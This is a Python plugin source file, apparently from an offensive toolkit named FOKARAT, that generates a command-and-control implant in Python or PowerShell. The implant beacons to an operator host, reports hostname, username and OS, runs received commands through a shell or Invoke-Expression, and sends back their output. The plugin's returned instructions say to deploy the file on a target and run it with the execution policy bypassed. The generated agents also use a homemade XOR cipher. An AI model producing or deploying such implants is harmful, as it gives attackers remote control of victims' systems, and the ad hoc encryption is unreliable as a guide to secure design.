"""
FOKARAT - Agent C2 HTTP/HTTPS
Généré comme payload PowerShell/Python pour la cible.
"""
import os
from sdk import PluginBase, PluginMetadata


class HTTPC2Agent(PluginBase):
    """
    Génère un agent C2 HTTP(S) pour cible Windows ou Linux.
    """

    @property
    def metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="HTTP C2 Agent",
            version="1.0.0",
            author="FOKAS",
            description="Génère un agent C2 HTTP(S) chiffré (Python ou PowerShell).",
            category="c2",
            tags=["c2", "agent", "http"],
            requires_scope=True,
            target_param="target",
        )

    def _execute(self, config, args=None) -> dict:
        if not args or not isinstance(args, dict):
            return {"status": "error", "message": "args requis"}

        target = args.get("target")
        lhost = args.get("lhost") or config.get("lhost")
        lport = args.get("lport") or 8443
        session_key = args.get("session_key", "")
        agent_type = args.get("agent_type", "python")  # python / powershell
        interval = args.get("interval", 5)

        if not lhost:
            return {"status": "error", "message": "lhost requis"}
        if not session_key:
            return {"status": "error", "message": "session_key requis (base64)"}

        if agent_type == "python":
            code = self._python_agent(lhost, lport, session_key, interval)
            ext = "py"
        elif agent_type == "powershell":
            code = self._powershell_agent(lhost, lport, session_key, interval)
            ext = "ps1"
        else:
            return {"status": "error", "message": f"Type '{agent_type}' inconnu"}

        out_dir = config.get("output_dir", "output")
        os.makedirs(out_dir, exist_ok=True)
        out_path = os.path.join(out_dir, f"c2_agent.{ext}")

        with open(out_path, "w", encoding="utf-8") as f:
            f.write(code)
        if ext == "py":
            os.chmod(out_path, 0o755)

        return {
            "status": "success",
            "agent_type": agent_type,
            "agent_path": out_path,
            "target": target,
            "lhost": lhost,
            "lport": lport,
            "interval": interval,
            "next_step": (
                f"1. Déployer {out_path} sur {target}\n"
                f"2. Exécuter : {'python3' if ext == 'py' else 'powershell -ExecutionPolicy Bypass -File'} {os.path.basename(out_path)}\n"
                f"3. Vérifier la session avec [83]"
            ),
        }

    def _python_agent(self, lhost, lport, session_key_b64, interval):
        return f'''#!/usr/bin/env python3
"""
FOKARAT C2 Agent (Python)
LHOST={lhost} LPORT={lport} Interval={interval}s
Usage éducatif uniquement.
"""
import os
import sys
import json
import time
import base64
import socket
import hashlib
import secrets
import platform
import subprocess
import urllib.request
import urllib.error

LHOST = "{lhost}"
LPORT = {lport}
INTERVAL = {interval}
SESSION_KEY = base64.b64decode("{session_key_b64}")

SESSION_ID = secrets.token_hex(8)
NONCE_SIZE = 12


def keystream(nonce, length):
    out = b""
    counter = 0
    while len(out) < length:
        block = hashlib.sha256(SESSION_KEY + nonce + counter.to_bytes(8, "big")).digest()
        out += block
        counter += 1
    return out[:length]


def encrypt(data):
    if isinstance(data, str):
        data = data.encode()
    nonce = secrets.token_bytes(NONCE_SIZE)
    ks = keystream(nonce, len(data))
    ct = bytes(a ^ b for a, b in zip(data, ks))
    tag = hashlib.sha256(SESSION_KEY + nonce + ct).digest()[:16]
    return base64.b64encode(nonce + tag + ct).decode()


def decrypt(b64_blob):
    blob = base64.b64decode(b64_blob)
    nonce = blob[:NONCE_SIZE]
    tag = blob[NONCE_SIZE:NONCE_SIZE + 16]
    ct = blob[NONCE_SIZE + 16:]
    expected = hashlib.sha256(SESSION_KEY + nonce + ct).digest()[:16]
    if tag != expected:
        raise ValueError("Tag invalide")
    ks = keystream(nonce, len(ct))
    return bytes(a ^ b for a, b in zip(ct, ks))


def get_info():
    return {{
        "hostname": platform.node(),
        "username": os.environ.get("USER") or os.environ.get("USERNAME") or "?",
        "os": f"{{platform.system()}} {{platform.release()}}",
        "arch": platform.machine(),
        "python": platform.python_version(),
    }}


def beacon(msg_dict):
    url = f"http://{{LHOST}}:{{LPORT}}/beacon"
    encrypted = encrypt(json.dumps(msg_dict))
    payload = json.dumps({{"session_id": SESSION_ID, "data": encrypted}}).encode()
    req = urllib.request.Request(url, data=payload, headers={{"Content-Type": "application/json"}})
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read().decode())
            encrypted_resp = data.get("data")
            if not encrypted_resp:
                return {{"commands": []}}
            return json.loads(decrypt(encrypted_resp))
    except Exception:
        return None


def exec_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        return (result.stdout + result.stderr)[:10000]
    except subprocess.TimeoutExpired:
        return "[-] Timeout"
    except Exception as e:
        return f"[-] {{e}}"


def main():
    # Premier checkin
    beacon({{"type": "checkin", "info": get_info()}})

    while True:
        try:
            resp = beacon({{"type": "checkin", "info": {{}}}})
            if resp is None:
                time.sleep(INTERVAL)
                continue

            for cmd in resp.get("commands", []):
                if cmd.strip().lower() in ("exit", "quit"):
                    sys.exit(0)
                output = exec_cmd(cmd)
                beacon({{"type": "result", "command": cmd, "output": output}})

            time.sleep(INTERVAL)
        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(INTERVAL)


if __name__ == "__main__":
    main()
'''

    def _powershell_agent(self, lhost, lport, session_key_b64, interval):
        return f'''<#
FOKARAT C2 Agent (PowerShell)
LHOST={lhost} LPORT={lport} Interval={interval}s
Usage éducatif uniquement.
#>

$LHOST = "{lhost}"
$LPORT = {lport}
$INTERVAL = {interval}
$SESSION_KEY_B64 = "{session_key_b64}"

$SESSION_KEY = [System.Convert]::FromBase64String($SESSION_KEY_B64)
$SESSION_ID = -join ((1..16) | ForEach-Object {{ '{0:x}' -f (Get-Random -Max 16) }})

function Get-Keystream($Nonce, $Length) {{
    $out = New-Object System.Collections.Generic.List[byte]
    $counter = 0
    while ($out.Count -lt $Length) {{
        $block = [System.Security.Cryptography.SHA256]::Create().ComputeHash(
            $SESSION_KEY + $Nonce + [System.BitConverter]::GetBytes([uint64]$counter))
        $out.AddRange($block)
        $counter++
    }}
    return $out.ToArray()[0..($Length - 1)]
}}

function Encrypt-Data($Data) {{
    if ($Data -is [string]) {{ $Data = [System.Text.Encoding]::UTF8.GetBytes($Data) }}
    $nonce = New-Object byte[] 12
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($nonce)
    $ks = Get-Keystream $nonce $Data.Length
    $ct = New-Object byte[] $Data.Length
    for ($i = 0; $i -lt $Data.Length; $i++) {{ $ct[$i] = $Data[$i] -bxor $ks[$i] }}
    $tag = [System.Security.Cryptography.SHA256]::Create().ComputeHash(
        $SESSION_KEY + $nonce + $ct)[0..15]
    $combined = $nonce + $tag + $ct
    return [System.Convert]::ToBase64String($combined)
}}

function Decrypt-Data($B64) {{
    $blob = [System.Convert]::FromBase64String($B64)
    $nonce = $blob[0..11]
    $tag = $blob[12..27]
    $ct = $blob[28..($blob.Length - 1)]
    $ks = Get-Keystream $nonce $ct.Length
    $pt = New-Object byte[] $ct.Length
    for ($i = 0; $i -lt $ct.Length; $i++) {{ $pt[$i] = $ct[$i] -bxor $ks[$i] }}
    return [System.Text.Encoding]::UTF8.GetString($pt)
}}

function Get-Info {{
    return @{{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = (Get-WmiObject Win32_OperatingSystem).Caption
        arch = $env:PROCESSOR_ARCHITECTURE
    }}
}}

function Send-Beacon($Msg) {{
    $url = "http://${{LHOST}}:${{LPORT}}/beacon"
    $encrypted = Encrypt-Data ($Msg | ConvertTo-Json -Compress)
    $payload = @{{
        session_id = $SESSION_ID
        data = $encrypted
    }} | ConvertTo-Json -Compress

    try {{
        $resp = Invoke-RestMethod -Uri $url -Method POST -Body $payload `
            -ContentType "application/json" -TimeoutSec 15
        $decrypted = Decrypt-Data $resp.data
        return $decrypted | ConvertFrom-Json
    }} catch {{
        return $null
    }}
}}

function Execute-Cmd($Cmd) {{
    try {{
        $out = Invoke-Expression $Cmd 2>&1 | Out-String
        return $out.Substring(0, [Math]::Min(10000, $out.Length))
    }} catch {{
        return "[-] $_"
    }}
}}

# Boucle principale
Write-Host "[*] FOKARAT C2 Agent démarré (LHOST=$LHOST)"
Send-Beacon @{{ type = "checkin"; info = (Get-Info) }} | Out-Null

while ($true) {{
    try {{
        $resp = Send-Beacon @{{ type = "checkin"; info = @{{}} }}
        if ($resp -and $resp.commands) {{
            foreach ($cmd in $resp.commands) {{
                if ($cmd -match "^(exit|quit)$") {{ exit }}
                $output = Execute-Cmd $cmd
                Send-Beacon @{{ type = "result"; command = $cmd; output = $output }} | Out-Null
            }}
        }}
    }} catch {{}}
    Start-Sleep -Seconds $INTERVAL
}}
'''